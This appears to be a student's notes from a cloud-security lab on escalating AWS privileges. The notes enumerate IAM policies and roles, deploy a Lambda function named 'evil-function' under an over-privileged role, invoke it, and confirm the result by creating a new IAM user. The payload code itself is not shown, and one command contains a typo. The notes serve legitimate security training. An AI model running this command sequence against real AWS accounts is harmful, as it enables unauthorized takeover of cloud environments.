

Listing attached user policies
`aws iam list-attached-user-policies --user-name student`
Retrieving user policy details
`aws iam list-user-policies --user-name student`
![[Pasted image 20210503160255.png]]
`aws iam get-user-policy --user-name student --policy-name terraform-2021021213362984700000001`
![[Pasted image 20210503160428.png]]

Finding Lambda Role details
`aws iam list-roles`
![[Pasted image 20210503160602.png]]
`aws iam get-role --role-name lab11lambdaiam`
![[Pasted image 20210503160706.png]]
`aws iam list-role-policies --role-name lab11lambdaiam`
![[Pasted image 20210503160827.png]]
`aws iam get-role-policiy --role-name lab11lambdaiam policy-name terraform-2021021213362984700000001`
![[Pasted image 20210503161024.png]]

Creating or lambda function
![[Pasted image 20210503161124.png]]
`zip evil-function.zip evil.py`

`aws lambda create-function --function-name evil-function --runtime python3.8 --zip-file fileb://evil-function.zip --handler evil.handler --role arn:aws:iam::645723898191:role/lab11lambdaiam`
![[Pasted image 20210503183020.png]]
Invoking the lambda function
`aws lambda invoke --function-name evil-function output.txt`
![[Pasted image 20210503183159.png]]

Confirming escalated privileges
`aws iam create-user --user-name Bob`
![[Pasted image 20210503183326.png]]